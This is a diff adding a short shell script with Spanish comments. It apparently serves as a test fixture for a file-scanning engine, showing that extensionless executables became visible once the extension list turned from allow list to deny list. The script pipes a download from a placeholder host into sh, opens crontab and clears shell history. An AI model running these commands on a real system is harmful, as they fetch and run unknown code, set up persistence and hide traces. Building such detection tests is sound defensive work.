@@ -1,0 +1,7 @@
+#!/bin/sh
+# Un script ejecutable sin extension: la forma idiomatica. Antes de que la
+# lista de extensiones pasara de permiso a veto, este fichero entero era
+# invisible para el motor.
+curl -s https://ejemplo.invalid/a.sh | sh
+crontab -e
+history -c
